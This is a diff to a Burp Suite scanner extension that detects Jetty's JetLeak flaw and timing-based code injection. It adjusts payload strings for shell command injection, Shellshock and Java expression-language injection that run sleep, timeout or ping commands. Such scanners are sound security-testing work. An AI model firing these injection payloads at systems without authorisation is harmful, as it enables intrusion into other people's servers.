@@ -27,7 +27,7 @@ except ImportError:
     print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."
 
 
-version = "1.0.9"
+version = "1.0.10"
 callbacks = None
 
 
@@ -53,6 +53,8 @@ class BurpExtender(IBurpExtender):
 
         return
 
+# Detect CVE-2015-2080
+# Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
 class JetLeak(IScannerCheck):
     def __init__(self, callbacks):
         self._helpers = callbacks.getHelpers()
@@ -61,11 +63,11 @@ class JetLeak(IScannerCheck):
         if 'Referer' != insertionPoint.getInsertionPointName():
             return None
         attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest("\x00"))
-        resp_start = self._helpers.bytesToString(attack.getResponse())[:30]
-        if '400 Illegal character 0x0 in state' in resp_start:
+        resp_start = self._helpers.bytesToString(attack.getResponse())[:90]
+        if '400 Illegal character 0x0 in state' in resp_start and '<<<' in resp_start:
             return [CustomScanIssue(attack.getHttpService(), self._helpers.analyzeRequest(attack).getUrl(), [attack], 'CVE-2015-2080 (JetLeak)',
-                                                "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory.<br/>"
-                                                "Refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information.", 'Firm', 'High')]
+                                                "The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory<br/>"
+                                                "Please refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information", 'Firm', 'High')]
         return None
 
 # This extends the active scanner with a number of timing-based code execution checks
@@ -80,10 +82,10 @@ class CodeExec(IScannerCheck):
         self._payloads = {
             # Exploits shell command injection into '$input' on linux and "$input" on windows:
             # and CVE-2014-6271, CVE-2014-6278
-            'any': ['"&timeout $time&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],
+            'any': ['"&ping -n $time localhost&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],
             'php': [],
             'perl': [],
-            'ruby': [],
+            'ruby': ['|timeout $time&sleep $time'],
             # Expression language injection
             'java': [
                 '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
@@ -128,15 +130,16 @@ class CodeExec(IScannerCheck):
         for payload in payloads:
             if (baseTime == 0):
                 baseTime = self._attack(basePair, insertionPoint, payload, 0)[0]
-            if (self._attack(basePair, insertionPoint, payload, 10)[0] > baseTime + 6):
+            if (self._attack(basePair, insertionPoint, payload, 11)[0] > baseTime + 6):
                 print "Suspicious delay detected. Confirming it's consistent..."
                 (dummyTime, dummyAttack) = self._attack(basePair, insertionPoint, payload, 0)
                 if (dummyTime < baseTime + 4):
-                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 10)
+                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 11)
                     if (timer > dummyTime + 6):
                         print "Code execution confirmed"
                         url = self._helpers.analyzeRequest(attack).getUrl()
                         if (url in self._done):
+                            print "Skipping report - vulnerability already reported"
                             break
                         self._done.append(url)
                         return [CustomScanIssue(attack.getHttpService(), url, [dummyAttack, attack], 'Code injection',
@@ -147,7 +150,12 @@ class CodeExec(IScannerCheck):
         return None
 
     def _getLangs(self, basePair):
-        ext = self._helpers.analyzeRequest(basePair).getUrl().getPath().split('.')[-1]
+        path = self._helpers.analyzeRequest(basePair).getUrl().getPath()
+        if '.' in path:
+            ext = path.split('.')[-1]
+        else:
+            ext = ''
+
         if (ext in self._extensionMappings):
             code = self._extensionMappings[ext]
         else:
